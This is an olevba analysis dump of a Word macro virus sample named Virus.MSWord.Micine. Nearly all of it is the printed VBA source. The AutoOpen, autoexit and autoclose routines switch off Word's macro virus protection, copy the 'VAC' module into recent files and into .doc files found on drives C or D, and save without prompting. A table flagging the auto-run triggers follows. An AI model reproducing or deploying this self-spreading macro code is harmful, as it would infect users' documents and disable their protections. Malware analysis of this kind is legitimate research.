olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Micine-eb31679e688aa59d867dadb65c1875bdeaa77226
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Micine-eb31679e688aa59d867dadb65c1875bdeaa77226 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VAC.bas 
in file: Virus.MSWord.Micine-eb31679e688aa59d867dadb65c1875bdeaa77226 - OLE stream: 'Macros/VBA/VAC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'ZAVSoft200278IIFHNI@#/...mini antimacro vakcine 99
On Error Resume Next
Set myRange = ActiveDocument.Paragraphs(1).Range
myRange.Font.Hidden = False
Options.VirusProtection = False
Application.DisplayRecentFiles = True
RecentFiles.Maximum = 9
 Dim MyDate$: Dim macnam: MyDate$ = Date
 Dim zzz: Dim doc$: Dim zz: Dim mypath(2)
 ReDim mydocs(0): Dim num: Dim size: Dim virdoc
Set cntnr = MacroContainer
    doc$ = cntnr.FullName
com = MyDate$ Like "19*"
If com = True Then GoTo dest
begin:
zz = RecentFiles.Count
For z = 1 To zz
zzz = RecentFiles(z)
Application.OrganizerDelete Source:=zzz, _
         Name:="Module", _
        Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=doc$, _
        Destination:=zzz, Name:="VAC", _
        Object:=wdOrganizerObjectProjectItems
        Next z
GoTo ex
dest:
mypath(1) = CurDir("C"): mypath(2) = CurDir("D")
Randomize
n = Int((2 * Rnd) + 1)
Set fs = Application.FileSearch
With fs
    .LookIn = mypath(n)
    .SearchSubFolders = True
    .FileName = "*.doc"
    If .Execute > 0 Then
        size = .FoundFiles.Count
        ReDim mydocs(size)
        For I = 1 To size - 1
        mydocs(I) = .FoundFiles(I)
        Next I
        For I = 1 To size
   
    Application.OrganizerDelete Source:=mydocs(x), _
         Name:="module", _
        Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=doc$, _
        Destination:=mydocs(I), Name:="VAC", _
        Object:=wdOrganizerObjectProjectItems
        Next I
    Else
        GoTo begin
    End If
    End With
ex:
End Sub
Sub autoexit()
Options.VirusProtection = False
AutoOpen
End Sub

Sub autoclose()
Documents.Save NoPrompt:=True, OriginalFormat:=wdOriginalDocumentFormat
Options.VirusProtection = False
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
+----------+--------------------+---------------------------------------------+
